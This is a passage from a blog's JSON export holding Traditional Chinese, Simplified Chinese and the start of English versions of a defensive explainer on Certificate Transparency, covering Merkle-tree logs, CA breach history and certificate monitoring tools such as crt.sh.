日誌是否正確運作——它們是否真的僅可附加、密碼學證明是否有效，以及日誌是否沒有不當行為。這確保了整個系統的完整性。 🎬 真實世界情境你擁有 example.com 並使用 CT 監控： 正常運作：你的 CA 為 example.com 發行憑證並記錄到 CT 你收到通知：你的監控服務提醒你有新憑證 你驗證：你確認這是你的合法憑證更新 攻擊情境： 攻擊者入侵 CA：他們欺騙或駭入 CA 為 example.com 發行憑證 憑證被記錄：CA 將其提交到 CT 日誌（瀏覽器要求） 你收到警報：你的監控服務偵測到未經授權的憑證 你採取行動：你回報詐欺憑證，將其撤銷，並調查漏洞 沒有 CT，你可能永遠不會知道詐欺憑證，直到它被用於攻擊。 技術基礎：Merkle 樹 憑證透明化的核心是一個優雅的資料結構：Merkle 樹。這種密碼學結構使 CT 日誌既高效又防篡改。 Merkle 樹以二元樹組織憑證，其中： 每個葉節點包含憑證的雜湊值 每個父節點包含其兩個子節點的雜湊值 根雜湊值代表整個日誌的狀態 這種結構提供了強大的特性： 高效驗證：要證明憑證在日誌中，你只需要提供從憑證到根的小型「稽核路徑」雜湊值——而不是整個日誌。對於擁有一百萬個憑證的日誌，你只需要大約 20 個雜湊值來證明包含性。 篡改偵測：對日誌中任何憑證的任何更改都會改變根雜湊值。由於根雜湊值是公開已知且被監控的，篡改會立即被偵測到。 僅可附加證明：Merkle 樹結構允許證明日誌只增長（新增憑證）而沒有修改或移除舊條目。這稱為「一致性證明」。 graph TB A([根雜湊值H1234]) --> B([H12]) A --> C([H34]) B --> D([H1憑證 1]) B --> E([H2憑證 2]) C --> F([H3憑證 3]) C --> G([H4憑證 4]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:3px style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px 🔐 密碼學保證Merkle 樹結構提供數學確定性： 要證明憑證 2 在日誌中，提供：H1、H34 驗證者計算：H2（憑證 2 的雜湊值），然後 H12 = hash(H1 + H2)，然後根 = hash(H12 + H34) 如果計算的根與公佈的根匹配，憑證 2 肯定在日誌中 這只需要 2 個雜湊值，而不是下載所有 4 個憑證 憑證透明化的好處 CT 的實施在整個網路上提供了實質的資安改進： 早期偵測誤發憑證：網域擁有者可以在數小時或數天內偵測到未經授權的憑證，而不是數月或永遠不會。這大幅減少了攻擊者的機會窗口。 憑證機構的問責制：CA 知道他們的行為是公開可見且可稽核的。這為適當的資安實踐和仔細驗證創造了強大的誘因。 減少 CA 入侵的影響：當 CA 被入侵時，CT 日誌提供所有發行的詐欺憑證的完整記錄，實現快速回應和撤銷。 研究與分析：資安研究人員可以分析 CT 日誌以識別趨勢、發現錯誤配置，並改進整個業界的憑證實踐。 合規與稽核：組織可以證明他們遵循憑證政策，並快速識別其網域內的影子 IT 或未經授權的憑證發行。 ✨ 實際影響自 CT 成為強制性以來： Symantec 事件（2017）：CT 日誌揭露 Symantec 在沒有適當驗證的情況下發行了 30,000 多個憑證，導致他們從瀏覽器信任儲存中被移除 更快的偵測：偵測誤發憑證的平均時間從數月降至數小時 增加的問責制：CA 投資更多資安，因為他們知道自己的行為是透明的 減少詐欺：偵測風險使詐欺憑證發行對攻擊者的吸引力大大降低 監控憑證透明化日誌 CT 最強大的功能之一是任何人都可以監控日誌。幾個工具和服務使這變得容易： crt.sh：用於搜尋 CT 日誌的免費網頁介面。只需輸入網域名稱即可查看為其發行的所有憑證。這對於檢查未經授權憑證的網域擁有者來說非常寶貴。 Facebook CT 監控：Facebook 提供免費服務，監控你網域的 CT 日誌，並在發行新憑證時發送警報。 Google CT 搜尋：Google 提供搜尋和分析 CT 日誌的工具，對資安研究和調查很有用。 Certstream：憑證新增到 CT 日誌時的即時串流。資安研究人員使用它來偵測網路釣魚網域、域名搶註和其他惡意活動。 商業服務：Censys、Shodan 和各種資安供應商等公司提供進階 CT 監控，包括警報、分析和與資安營運的整合。 🔍 親自試試造訪 crt.sh 並搜尋你擁有的網域或熱門網站： 輸入網域（例如 google.com） 查看為該網域發行的所有憑證 注意時間戳記、憑證機構和有效期 尋找任何意外或可疑的憑證 這種透明化對每個人都可用——不需要特殊存取權限。 挑戰與限制 雖然憑證透明化非常成功，但並非沒有挑戰： 隱私問題：每個發行的憑證都成為公開知識。這意味著任何人都可以看到你正在使用哪些網域和子網域，可能在你準備好宣布之前就揭露內部基礎設施或即將推出的專案。 日誌可擴展性：隨著網路成長和憑證生命週期縮短（從數年到數月），CT 日誌必須處理不斷增加的數量。數十億個憑證需要被記錄、儲存和可查詢。 監控開銷：擁有數千個網域的網域擁有者需要複雜的監控系統來追蹤所有憑證。小型組織可能缺乏有效監控的資源。 誤報：合法的憑證更新、測試憑證和 CDN 憑證可能觸發警報，需要仔細調整監控系統。 不完整的覆蓋範圍：雖然主要瀏覽器執行 CT，但某些客戶端和應用程式不執行。這創造了詐欺憑證仍可能被使用的缺口。 日誌營運商信任：雖然 CT 減少了對 CA 的信任，但它將一些信任轉移到日誌營運商。行為不當的日誌可能拒絕記錄憑證或提供虛假證明，儘管多日誌要求和稽核減輕了這種風險。 ⚠️ 隱私考量在為敏感子網域請求憑證之前： 記住它會出現在公開 CT 日誌中 考慮為內部子網域使用萬用字元憑證 注意 CT 日誌會揭露你的基礎設施拓撲 在規劃網域命名策略時考慮透明化 憑證透明化的未來 憑證透明化持續演進，有幾個發展即將到來： 更短的憑證生命週期：業界正朝著更短的憑證有效期（從 2 年到 1 年到可能的 90 天）發展。這減少了被入侵憑證的影響，但增加了必須記錄的憑證數量。 改進的隱私：對隱私保護 CT 機制的研究旨在提供透明化而不揭露敏感網域資訊。正在探索編輯和延遲發佈等技術。 擴大範圍：CT 模型正被改編用於 HTTPS 憑證以外的其他信任系統，包括程式碼簽署憑證、電子郵件憑證，甚至軟體供應鏈透明化。 更好的整合：CT 日誌、憑證機構和監控系統之間更緊密的整合將實現更快的誤發憑證偵測和回應。 自動化回應：未來的系統可能會自動撤銷在 CT 日誌中偵測到的可疑憑證，將攻擊的時間窗口從數小時減少到數分鐘。 去中心化：基於區塊鏈的方法可以進一步去中心化 CT 日誌，減少對特定日誌營運商的依賴並增加韌性。 timeline title 憑證透明化的演進 2011 : DigiNotar 漏洞 : 憑證安全的警鐘 2013 : CT 規範（RFC 6962） : Google 提出憑證透明化 2015 : Chrome CT 執行開始 : 瀏覽器開始要求 CT 2018 : CT 對所有憑證強制執行 : 所有主要瀏覽器執行 CT 2023 : 成熟的生態系統 : 數十億個憑證被記錄 : 廣泛的監控和工具 未來 : 增強的隱私與自動化 : 隱私保護機制 : 自動化威脅回應 開始使用憑證透明化 無論你是網域擁有者、資安專業人員還是好奇的開發者，以下是開始使用 CT 的方法： 對網域擁有者 步驟 1：了解你目前的憑證 造訪 crt.sh 並搜尋你的網域 檢視為你的網域發行的所有憑證 識別任何意外或未經授權的憑證 步驟 2：設定監控 使用 Facebook CT 監控或 crt.sh 警報等免費服務 為你的網域上的新憑證配置通知 建立調查警報的流程 步驟 3：建立回應程序 定義誰調查憑證警報 建立驗證合法憑證的流程 記錄回報和撤銷詐欺憑證的步驟 對資安研究人員 步驟 1：探索 CT 日誌 使用 crt.sh 搜尋有趣的模式 嘗試 Certstream 進行即時憑證監控 分析憑證發行趨勢和異常 步驟 2：建構監控工具 使用 CT 日誌 API 建構自訂監控 為特定模式（域名搶註、網路釣魚網域）建立警報 貢獻開源 CT 工具 步驟 3：貢獻生態系統 向網域擁有者回報可疑憑證 與資安社群分享發現 協助改進 CT 工具和文件 對開發者 步驟 1：了解 CT 要求 學習瀏覽器如何執行 CT 政策 了解憑證的 SCT 要求 檢視你的憑證發行流程 步驟 2：實作 CT 驗證 在你的應用程式中驗證 SCT 使用 CT 日誌 API 檢查憑證狀態 為你組織的網域實作監控 步驟 3：保持資訊更新 追蹤瀏覽器的 CT 政策變更 監控 CT 日誌營運商公告 參與 CT 社群討論 🎯 快速入門練習嘗試這個實作練習來了解 CT： 造訪 crt.sh 搜尋 facebook.com 注意發行的數千個憑證 點擊最近的憑證查看詳細資訊 觀察顯示哪些 CT 日誌記錄了它的 SCT 資訊 現在搜尋你自己的網域（如果你有的話） 驗證所有憑證都是合法的 這個 5 分鐘的練習展示了保護整個網路的透明化。 結論：透明化作為資安基礎 憑證透明化代表了我們在網際網路上處理信任方式的根本轉變。我們現在擁有一個透過透明化、密碼學和公開問責制來驗證信任的系統，而不是盲目信任憑證機構。 CT 的成功展示了一個強大的原則：透明化使系統更安全。當行為是公開且可稽核的時，不良行為者面臨偵測和後果。這個原則延伸到憑證之外，包括軟體供應鏈、程式碼簽署和其他信任系統。 對網域擁有者來說，CT 提供了安心——如果有人試圖冒充你的網站，你會知道。對資安研究人員來說，它是偵測威脅和分析趨勢的寶貴工具。對更廣泛的網際網路社群來說，它是使 HTTPS 更可靠和安全的信任基礎。 瀏覽器中的小鎖頭圖示代表的不僅僅是加密——它代表一個透明、可稽核的系統，詐欺憑證無法隱藏在陰影中。這就是憑證透明化的力量。 💭 最後的想法「陽光據說是最好的消毒劑。」——Louis Brandeis 憑證透明化為憑證生態系統帶來陽光，透過公開問責制的簡單但強大的原則，讓網路對每個人都更安全。 額外資源 官方規範： RFC 6962: Certificate Transparency RFC 9162: Certificate Transparency Version 2.0 工具與服務： crt.sh - 搜尋 CT 日誌 Facebook CT Monitoring - 免費監控服務 Certstream - 即時憑證串流 學習資源： Certificate Transparency: The Foundation of Trust Google’s CT Policy CT Log List","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://neo01.com/tags/HTTPS/"},{"name":"Certificate","slug":"Certificate","permalink":"https://neo01.com/tags/Certificate/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://neo01.com/tags/Cryptography/"},{"name":"Web Security","slug":"Web-Security","permalink":"https://neo01.com/tags/Web-Security/"}],"lang":"zh-TW"},{"title":"证书透明化：保护 HTTPS 的公开账本","slug":"2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS-zh-CN","date":"un11fin11","updated":"un44fin44","comments":true,"path":"/zh-CN/2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","permalink":"https://neo01.com/zh-CN/2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","excerpt":"探索证书透明化如何作为 HTTPS 证书的公开监督机制，通过透明、仅可附加的日志防止欺诈证书，让网络更安全。","text":"还记得你第一次了解 HTTPS 和浏览器中那个小锁头图标吗？你可能感到安心，知道你的连接是加密且安全的。但这里有个可能让安全专业人员夜不成眠的问题：你如何知道那个 HTTPS 证书是合法的？如果有人秘密地为你的银行网站发行了假证书呢？ 这正是证书透明化（Certificate Transparency, CT）所要解决的问题。 2011 年，荷兰证书机构 DigiNotar 发生重大安全漏洞，导致为 Google、Yahoo 甚至情报机构等知名域名发行了欺诈证书。这些假证书让攻击者能够冒充合法网站，拦截用户认为安全的加密通信。这起事件敲响了警钟：证书系统需要透明化。 证书透明化不只是另一个安全协议——它是一种革命性的方法，将证书发行视为公开账本。任何证书机构发行的每个证书都会被记录在任何人都可以监控的公开可审计、仅可附加的日志中。可以把它想象成 HTTPS 证书的区块链，但专门为透明化和问责制而设计。 💡 什么是证书透明化？证书透明化（CT）是一个框架，为证书机构发行的所有 SSL/TLS 证书建立公开、可验证的日志。这些日志是仅可附加的（证书可以被添加但永远不能被移除或修改），并且经过密码学保护，使得证书机构几乎不可能在不被检测的情况下发行欺诈证书。 问题：没有验证的信任 在证书透明化之前，证书系统是基于盲目信任运作的。当你使用 HTTPS 访问网站时，你的浏览器会检查证书是否由受信任的证书机构（CA）签署。如果是，你会看到绿色锁头。如果不是，你会看到可怕的警告。 这个系统有一个关键缺陷：它假设证书机构是无懈可击且值得信赖的。但证书机构是由人类经营的，使用有错误的软件，并且可能被攻击者入侵。当 CA 被入侵或犯错时，没有系统性的方法可以检测欺诈证书，直到它们被主动用于攻击。 后果是严重的： DigiNotar 漏洞（2011）：为 300 多个域名发行欺诈证书，导致该 CA 破产 Comodo 漏洞（2011）：为主要网络服务发行假证书 TURKTRUST 事件（2013）：意外地向客户发行中继 CA 证书 每起事件都侵蚀了对整个证书生态系统的信任。业界需要一个不仅仅依赖信任证书机构的解决方案。 graph TB A([🏢 证书机构发行证书]) --> B{受信任的 CA？} B -->|是| C([✅ 浏览器信任证书]) B -->|否| D([❌ 浏览器显示警告]) E([⚠️ 问题：无法检测来自受信任 CA 的欺诈证书]) -.-> A style E fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px 解决方案：公开、仅可附加的日志 证书透明化引入了一个简单但强大的概念：让每个证书都公开。当证书机构发行证书时，它必须将其提交到多个独立的 CT 日志。这些日志具有以下特性： 仅可附加：证书只能被添加，永远不能被修改或删除。这创造了所有已发行证书的不可变历史记录。 公开可审计：任何人都可以查询日志，查看为任何域名发行了哪些证书。域名拥有者可以监控未经授权的证书。 密码学可验证：日志使用 Merkle 树结构来确保完整性。任何对日志的篡改都会立即被检测到。 独立运作：多个组织运作 CT 日志，防止任何单点故障或控制。 这种透明化将证书生态系统从&quot;信任但不验证&quot;转变为&quot;信任并始终验证&quot;。 graph LR A([🏢 证书机构]) --> B([📝 CT 日志 1]) A --> C([📝 CT 日志 2]) A --> D([📝 CT 日志 3]) B --> E([🔍 监控者域名拥有者安全研究人员浏览器]) C --> E D --> E E --> F{检测到欺诈证书？} F -->|是| G([🚨 警报与撤销]) F -->|否| H([✅ 维持信任]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 证书透明化如何运作 CT 系统涉及几个关键参与者共同创造透明化： 证书机构（CAs） 当 CA 发行证书时，它会将证书（或预证书）提交到多个 CT 日志。日志会返回签署证书时间戳（SCT），这是证书已被记录的密码学证明。 CT 日志 独立组织运作 CT 日志，接受证书提交，将它们添加到仅可附加的日志中，并返回 SCT。主要的 CT 日志运营商包括 Google、Cloudflare、DigiCert 等。日志使用 Merkle 树结构构建，允许有效验证证书是否包含在日志中，而无需下载整个日志。 浏览器和客户端 现代浏览器要求证书在信任之前必须具有有效的 SCT。Chrome、Safari 和其他浏览器执行 CT 政策，拒绝信任未被记录的证书。这为 CA 参与 CT 创造了强大的激励。 监控者 域名拥有者、安全研究人员和自动化系统持续监控 CT 日志，查看为他们关心的域名发行的证书。当出现意外证书时，他们可以调查并在欺诈时采取行动。 审计者 审计者验证 CT 日志是否正确运作——它们是否真的仅可附加、密码学证明是否有效，以及日志是否没有不当行为。这确保了整个系统的完整性。 🎬 真实世界情境你拥有 example.com 并使用 CT 监控： 正常运作：你的 CA 为 example.com 发行证书并记录到 CT 你收到通知：你的监控服务提醒你有新证书 你验证：你确认这是你的合法证书更新 攻击情境： 攻击者入侵 CA：他们欺骗或黑入 CA 为 example.com 发行证书 证书被记录：CA 将其提交到 CT 日志（浏览器要求） 你收到警报：你的监控服务检测到未经授权的证书 你采取行动：你报告欺诈证书，将其撤销，并调查漏洞 没有 CT，你可能永远不会知道欺诈证书，直到它被用于攻击。 技术基础：Merkle 树 证书透明化的核心是一个优雅的数据结构：Merkle 树。这种密码学结构使 CT 日志既高效又防篡改。 Merkle 树以二叉树组织证书，其中： 每个叶节点包含证书的哈希值 每个父节点包含其两个子节点的哈希值 根哈希值代表整个日志的状态 这种结构提供了强大的特性： 高效验证：要证明证书在日志中，你只需要提供从证书到根的小型&quot;审计路径&quot;哈希值——而不是整个日志。对于拥有一百万个证书的日志，你只需要大约 20 个哈希值来证明包含性。 篡改检测：对日志中任何证书的任何更改都会改变根哈希值。由于根哈希值是公开已知且被监控的，篡改会立即被检测到。 仅可附加证明：Merkle 树结构允许证明日志只增长（添加证书）而没有修改或移除旧条目。这称为&quot;一致性证明&quot;。 graph TB A([根哈希值H1234]) --> B([H12]) A --> C([H34]) B --> D([H1证书 1]) B --> E([H2证书 2]) C --> F([H3证书 3]) C --> G([H4证书 4]) style A fill:#e8f5e9,stroke:#388e3c,stroke-width:3px style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#fff3e0,stroke:#f57c00,stroke-width:2px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px 🔐 密码学保证Merkle 树结构提供数学确定性： 要证明证书 2 在日志中，提供：H1、H34 验证者计算：H2（证书 2 的哈希值），然后 H12 = hash(H1 + H2)，然后根 = hash(H12 + H34) 如果计算的根与公布的根匹配，证书 2 肯定在日志中 这只需要 2 个哈希值，而不是下载所有 4 个证书 证书透明化的好处 CT 的实施在整个网络上提供了实质的安全改进： 早期检测误发证书：域名拥有者可以在数小时或数天内检测到未经授权的证书，而不是数月或永远不会。这大幅减少了攻击者的机会窗口。 证书机构的问责制：CA 知道他们的行为是公开可见且可审计的。这为适当的安全实践和仔细验证创造了强大的激励。 减少 CA 入侵的影响：当 CA 被入侵时，CT 日志提供所有发行的欺诈证书的完整记录，实现快速响应和撤销。 研究与分析：安全研究人员可以分析 CT 日志以识别趋势、发现错误配置，并改进整个业界的证书实践。 合规与审计：组织可以证明他们遵循证书政策，并快速识别其域名内的影子 IT 或未经授权的证书发行。 ✨ 实际影响自 CT 成为强制性以来： Symantec 事件（2017）：CT 日志揭露 Symantec 在没有适当验证的情况下发行了 30,000 多个证书，导致他们从浏览器信任存储中被移除 更快的检测：检测误发证书的平均时间从数月降至数小时 增加的问责制：CA 投资更多安全，因为他们知道自己的行为是透明的 减少欺诈：检测风险使欺诈证书发行对攻击者的吸引力大大降低 监控证书透明化日志 CT 最强大的功能之一是任何人都可以监控日志。几个工具和服务使这变得容易： crt.sh：用于搜索 CT 日志的免费网页界面。只需输入域名即可查看为其发行的所有证书。这对于检查未经授权证书的域名拥有者来说非常宝贵。 Facebook CT 监控：Facebook 提供免费服务，监控你域名的 CT 日志，并在发行新证书时发送警报。 Google CT 搜索：Google 提供搜索和分析 CT 日志的工具，对安全研究和调查很有用。 Certstream：证书添加到 CT 日志时的实时流。安全研究人员使用它来检测网络钓鱼域名、域名抢注和其他恶意活动。 商业服务：Censys、Shodan 和各种安全供应商等公司提供高级 CT 监控，包括警报、分析和与安全运营的集成。 🔍 亲自试试访问 crt.sh 并搜索你拥有的域名或热门网站： 输入域名（例如 google.com） 查看为该域名发行的所有证书 注意时间戳、证书机构和有效期 寻找任何意外或可疑的证书 这种透明化对每个人都可用——不需要特殊访问权限。 挑战与限制 虽然证书透明化非常成功，但并非没有挑战： 隐私问题：每个发行的证书都成为公开知识。这意味着任何人都可以看到你正在使用哪些域名和子域名，可能在你准备好宣布之前就揭露内部基础设施或即将推出的项目。 日志可扩展性：随着网络增长和证书生命周期缩短（从数年到数月），CT 日志必须处理不断增加的数量。数十亿个证书需要被记录、存储和可查询。 监控开销：拥有数千个域名的域名拥有者需要复杂的监控系统来追踪所有证书。小型组织可能缺乏有效监控的资源。 误报：合法的证书更新、测试证书和 CDN 证书可能触发警报，需要仔细调整监控系统。 不完整的覆盖范围：虽然主要浏览器执行 CT，但某些客户端和应用程序不执行。这创造了欺诈证书仍可能被使用的缺口。 日志运营商信任：虽然 CT 减少了对 CA 的信任，但它将一些信任转移到日志运营商。行为不当的日志可能拒绝记录证书或提供虚假证明，尽管多日志要求和审计减轻了这种风险。 ⚠️ 隐私考量在为敏感子域名请求证书之前： 记住它会出现在公开 CT 日志中 考虑为内部子域名使用通配符证书 注意 CT 日志会揭露你的基础设施拓扑 在规划域名命名策略时考虑透明化 证书透明化的未来 证书透明化持续演进，有几个发展即将到来： 更短的证书生命周期：业界正朝着更短的证书有效期（从 2 年到 1 年到可能的 90 天）发展。这减少了被入侵证书的影响，但增加了必须记录的证书数量。 改进的隐私：对隐私保护 CT 机制的研究旨在提供透明化而不揭露敏感域名信息。正在探索编辑和延迟发布等技术。 扩大范围：CT 模型正被改编用于 HTTPS 证书以外的其他信任系统，包括代码签名证书、电子邮件证书，甚至软件供应链透明化。 更好的集成：CT 日志、证书机构和监控系统之间更紧密的集成将实现更快的误发证书检测和响应。 自动化响应：未来的系统可能会自动撤销在 CT 日志中检测到的可疑证书，将攻击的时间窗口从数小时减少到数分钟。 去中心化：基于区块链的方法可以进一步去中心化 CT 日志，减少对特定日志运营商的依赖并增加韧性。 timeline title 证书透明化的演进 2011 : DigiNotar 漏洞 : 证书安全的警钟 2013 : CT 规范（RFC 6962） : Google 提出证书透明化 2015 : Chrome CT 执行开始 : 浏览器开始要求 CT 2018 : CT 对所有证书强制执行 : 所有主要浏览器执行 CT 2023 : 成熟的生态系统 : 数十亿个证书被记录 : 广泛的监控和工具 未来 : 增强的隐私与自动化 : 隐私保护机制 : 自动化威胁响应 开始使用证书透明化 无论你是域名拥有者、安全专业人员还是好奇的开发者，以下是开始使用 CT 的方法： 对域名拥有者 步骤 1：了解你目前的证书 访问 crt.sh 并搜索你的域名 查看为你的域名发行的所有证书 识别任何意外或未经授权的证书 步骤 2：设置监控 使用 Facebook CT 监控或 crt.sh 警报等免费服务 为你的域名上的新证书配置通知 建立调查警报的流程 步骤 3：建立响应程序 定义谁调查证书警报 建立验证合法证书的流程 记录报告和撤销欺诈证书的步骤 对安全研究人员 步骤 1：探索 CT 日志 使用 crt.sh 搜索有趣的模式 尝试 Certstream 进行实时证书监控 分析证书发行趋势和异常 步骤 2：构建监控工具 使用 CT 日志 API 构建自定义监控 为特定模式（域名抢注、网络钓鱼域名）创建警报 贡献开源 CT 工具 步骤 3：贡献生态系统 向域名拥有者报告可疑证书 与安全社区分享发现 协助改进 CT 工具和文档 对开发者 步骤 1：了解 CT 要求 学习浏览器如何执行 CT 政策 了解证书的 SCT 要求 查看你的证书发行流程 步骤 2：实现 CT 验证 在你的应用程序中验证 SCT 使用 CT 日志 API 检查证书状态 为你组织的域名实现监控 步骤 3：保持信息更新 追踪浏览器的 CT 政策变更 监控 CT 日志运营商公告 参与 CT 社区讨论 🎯 快速入门练习尝试这个实践练习来了解 CT： 访问 crt.sh 搜索 facebook.com 注意发行的数千个证书 点击最近的证书查看详细信息 观察显示哪些 CT 日志记录了它的 SCT 信息 现在搜索你自己的域名（如果你有的话） 验证所有证书都是合法的 这个 5 分钟的练习展示了保护整个网络的透明化。 结论：透明化作为安全基础 证书透明化代表了我们在互联网上处理信任方式的根本转变。我们现在拥有一个通过透明化、密码学和公开问责制来验证信任的系统，而不是盲目信任证书机构。 CT 的成功展示了一个强大的原则：透明化使系统更安全。当行为是公开且可审计的时，不良行为者面临检测和后果。这个原则延伸到证书之外，包括软件供应链、代码签名和其他信任系统。 对域名拥有者来说，CT 提供了安心——如果有人试图冒充你的网站，你会知道。对安全研究人员来说，它是检测威胁和分析趋势的宝贵工具。对更广泛的互联网社区来说，它是使 HTTPS 更可靠和安全的信任基础。 浏览器中的小锁头图标代表的不仅仅是加密——它代表一个透明、可审计的系统，欺诈证书无法隐藏在阴影中。这就是证书透明化的力量。 💭 最后的想法&quot;阳光据说是最好的消毒剂。&quot;——Louis Brandeis 证书透明化为证书生态系统带来阳光，通过公开问责制的简单但强大的原则，让网络对每个人都更安全。 额外资源 官方规范： RFC 6962: Certificate Transparency RFC 9162: Certificate Transparency Version 2.0 工具与服务： crt.sh - 搜索 CT 日志 Facebook CT Monitoring - 免费监控服务 Certstream - 实时证书流 学习资源： Certificate Transparency: The Foundation of Trust Google’s CT Policy CT Log List","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://neo01.com/tags/Security/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://neo01.com/tags/HTTPS/"},{"name":"Certificate","slug":"Certificate","permalink":"https://neo01.com/tags/Certificate/"},{"name":"Cryptography","slug":"Cryptography","permalink":"https://neo01.com/tags/Cryptography/"},{"name":"Web Security","slug":"Web-Security","permalink":"https://neo01.com/tags/Web-Security/"}],"lang":"zh-CN"},{"title":"Certificate Transparency: The Public Ledger Securing HTTPS","slug":"2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS","date":"un11fin11","updated":"un44fin44","comments":true,"path":"2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","permalink":"https://neo01.com/2023/06/Certificate_Transparency_The_Public_Ledger_Securing_HTTPS/","excerpt":"Discover how Certificate Transparency acts as a public watchdog for HTTPS certificates, preventing fraudulent certificates and making the web safer for everyone through transparent, append-only logs.","text":"Remember when you first learned about HTTPS and that little padlock icon in your browser? You probably felt reassured knowing your connection was encrypted and secure. But here’s a question that might keep security professionals up at night: How do you know that HTTPS certificate is legitimate? What if someone secretly issued a fake certificate for your bank’s website? That’s exactly the problem Certificate Transparency (CT) was designed to solve. In 2011, a major security breach at DigiNotar, a Dutch certificate authority, resulted in fraudulent certificates being issued for high-profile domains like Google, Yahoo, and even intelligence agencies. These fake certificates allowed attackers to impersonate legitimate websites, intercepting encrypted communications that users believed were secure. The incident was a wake-up call: the certificate system needed transparency. Certificate Transparency isn’t just another security protocol - it’s a revolutionary approach that treats certificate issuance like a public ledger. Every certificate issued by any certificate authority gets recorded in publicly auditable, append-only logs that anyone can monitor. Think of it as a blockchain for HTTPS certificates, but designed specifically for transparency and accountability. 💡 What is Certificate Transparency?Certificate Transparency (CT) is a framework that creates public, verifiable logs of all SSL/TLS certificates issued by certificate authorities. These logs are append-only (certificates can be added but never removed or modified) and cryptographically secured, making it nearly impossible for certificate authorities to issue fraudulent certificates without detection. The Problem: Trust Without Verification Before Certificate Transparency, the certificate system operated on blind trust. When you visited a website using HTTPS, your browser checked if the certificate was signed by a trusted certificate authority (CA). If yes, you got the green padlock. If no, you got a scary warning. This system had a critical flaw: it assumed certificate authorities were infallible and trustworthy. But certificate authorities are run by humans, use software with bugs, and can be compromised by attackers. When a CA was breached or made mistakes, there was no systematic way to detect fraudulent certificates until they were actively used in attacks. The consequences were severe: DigiNotar breach (2011): Fraudulent certificates for 300+ domains, leading to the CA’s bankruptcy Comodo breach (2011): Fake certificates issued for major web services TURKTRUST incident (2013): Accidentally issued intermediate CA certificates to customers Each incident eroded trust in the entire certificate ecosystem. The industry needed a solution that didn’t rely solely on trusting certificate authorities. graph TB A([🏢 Certificate AuthorityIssues certificate]) --> B{Trusted CA?} B -->|Yes| C([✅ Browser trustscertificate]) B -->|No| D([❌ Browser showswarning]) E([⚠️ Problem:No way to detectfraudulent certificatesfrom trusted CAs]) -.-> A style E fill:#ffebee,stroke:#c62828,stroke-width:3px style C fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px The Solution: Public, Append-Only Logs Certificate Transparency introduces a simple but powerful concept: make every certificate public. When a certificate authority issues a certificate, it must submit it to multiple independent CT logs. These logs are: Append-Only: Certificates can only be added, never modified or deleted. This creates an immutable history of all certificates ever issued. Publicly Auditable: Anyone can query the logs to see what certificates have been issued for any domain. Domain owners can monitor for unauthorized certificates. Cryptographically Verifiable: The logs use Merkle tree structures to ensure integrity. Any tampering with the log would be immediately detectable. Independently Operated: Multiple organizations run CT logs, preventing any single point of failure or control. This transparency transforms the certificate ecosystem from “trust but don’t verify” to “trust and always verify.” graph LR A([🏢 CertificateAuthority]) --> B([📝 CT Log 1]) A --> C([📝 CT Log 2]) A --> D([📝 CT Log 3]) B --> E([🔍 MonitorsDomain ownersSecurity researchersBrowsers]) C --> E D --> E E --> F{Fraudulentcertificatedetected?} F -->|Yes| G([🚨 Alert & Revoke]) F -->|No| H([✅ Trust maintained]) style B fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style C fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style D fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:2px How Certificate Transparency Works The CT system involves several key players working together to create transparency: Certificate Authorities (CAs) When a CA issues a certificate, it submits the certificate (or a precertificate) to multiple CT logs. The logs return a Signed Certificate Timestamp (SCT), which is cryptographic proof that the certificate has been logged. CT Logs Independent organizations operate CT logs that accept certificate submissions, add them to their append-only logs, and return SCTs. Major CT log operators include Google, Cloudflare, DigiCert, and others. The logs are built using Merkle tree structures, which allow efficient verification that a certificate is included in the log without downloading the entire log. Browsers and Clients Modern browsers require certificates to have valid SCTs before trusting them. Chrome, Safari, and other browsers enforce CT policies, refusing to trust certificates that haven’t been logged. This creates a strong incentive for CAs to participate in CT. Monitors Domain owners, security researchers, and automated systems continuously monitor CT logs for certificates issued for domains they care about. When an unexpected certificate appears, they can investigate and take action if it’s fraudulent. Auditors Auditors verify that CT logs are operating correctly - that they’re truly append-only, that the cryptographic proofs are valid, and that logs aren’t misbehaving. This ensures the integrity of the entire system. 🎬 Real-World ScenarioYou own example.com and use CT monitoring: Normal operation: Your CA issues a certificate for example.com and logs it to CT You receive notification: Your monitoring service alerts you about the new certificate You verify: You confirm this is your legitimate certificate renewal Attack scenario: Attacker compromises a 